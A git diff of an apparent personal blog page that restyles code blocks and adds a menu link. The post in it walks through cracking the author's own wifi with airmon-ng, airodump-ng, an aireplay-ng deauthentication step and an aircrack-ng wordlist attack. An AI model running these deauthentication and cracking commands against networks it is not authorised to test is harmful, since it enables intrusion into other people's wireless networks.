@@ -103,7 +103,7 @@ sudo airmon-ng start intf The above command will remove that interface and add a
         <span class="header__right">
             
                 <nav class="menu">
-    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/posts">Blog</a></li><li><a href="/reading-list/">Reading list</a></li>
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/posts">Blog</a></li><li><a href="/reading-list/">Reading list</a></li><li><a href="/tags/">Tags</a></li>
     </ul>
 </nav>
 
@@ -147,17 +147,17 @@ sudo airmon-ng start intf The above command will remove that interface and add a
       <div class="post-content">
         <p>It&rsquo;s Thursday evening and I can&rsquo;t think of something to do. So, decided to write about cracking my own wifi using airmon/aircrack. I had a README written long time ago, so i had to clean it up and publish.</p>
 <p>first, we need to know the network interface, lets call it intf. We need to switch the interface to monitoring mode (if hardware supports of course).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo airmon-ng start intf
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo airmon-ng start intf
 </code></pre></div><p>The above command will remove that interface and add another with adding <code>mon</code> at the end.  The next step, is scanning the SSID around us and know the MAC and CH for that SSID</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo airodump-ng  intfmon
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo airodump-ng  intfmon
 </code></pre></div><p>once we have that, we start the capture with that SSID, CH and of course the interface.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo airodump-ng -c &lt;CH&gt; --bssid &lt;SSID&gt; -w dump  intfmon
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo airodump-ng -c &lt;CH&gt; --bssid &lt;SSID&gt; -w dump  intfmon
 </code></pre></div><p>At this point, we need to force clients to connect to that SSID so that airodump can capture the required packets</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo aireplay-ng -0  -a &lt;MAC&gt;  intfmon
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo aireplay-ng -0  -a &lt;MAC&gt;  intfmon
 </code></pre></div><p>At this point, the cap file will have packets, so we need to pass password file and that cap to get the password.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aircrack-ng -w password.lst -b &lt;MAC&gt;  dump-01.cap
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aircrack-ng -w password.lst -b &lt;MAC&gt;  dump-01.cap
 </code></pre></div><p>and if I am luck enough (I  because i added my password to the password.lst :)), <code>aircrack</code> will print the following message with the passowrd.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">KEY FOUND! <span style="color:#f92672">[</span> XXXXXXXX <span style="color:#f92672">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">KEY FOUND! [ XXXXXXXX ]
 </code></pre></div>
       </div>
     </article>
